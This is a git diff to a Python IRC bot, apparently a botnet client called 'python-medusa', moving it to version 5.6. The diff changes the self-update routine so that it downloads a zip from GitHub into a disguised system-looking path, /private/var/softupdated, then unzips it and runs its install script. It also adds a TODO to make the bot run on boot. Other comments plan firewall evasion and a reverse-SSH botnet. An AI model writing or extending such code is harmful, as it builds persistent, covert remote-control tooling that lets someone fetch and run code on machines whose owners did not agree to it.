@@ -22,6 +22,7 @@ from StringIO import StringIO
 from modules.logging import logfile, log
 
 #TODO: make portscan timeout or cancellable
+#TODO: wrap in installer and make it run on boot (in /var/something)
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
 #TODO: modules:
 #       download    will download the file at the given url and save it to the host machine
@@ -30,7 +31,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "5.5"                                                   # bot version
+version = "5.6"                                                   # bot version
 
 try:
     logfile(filename="bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -411,18 +412,18 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
     log('[*] Starting Selfupdate...')
     privmsg('[*] Starting Selfupdate...')
     log('[>]   Downloading source code from git')
-    cmd = "rm -Rf code.zip code; curl https://codeload.github.com/%s/%s/zip/master > code.zip" % (git_user, git_repo)
+    cmd = "mkdir -p /private/var/softupdated; rm -Rf /private/var/softupdated/code.zip /private/var/softupdated/code; curl https://codeload.github.com/%s/%s/zip/master > /private/var/softupdated/code.zip" % (git_user, git_repo)
     for line in run_shell(cmd):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
     privmsg('[>]   Unzipping...')
-    cmd = "unzip code.zip -d code"
+    cmd = "unzip /private/var/softupdated/code.zip -d /private/var/softupdated/code"
     for line in run_shell(cmd):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
     pid = os.getpid()
     privmsg('[>]   Running Update.sh')
-    cmd = "sh code/*/update.sh %s" % pid
+    cmd = "sh /private/var/softupdated/code/*/install.sh %s" % pid
     for line in run_shell(cmd):
         log('[>]    ',line)
         privmsg('[>]    %s' % line)
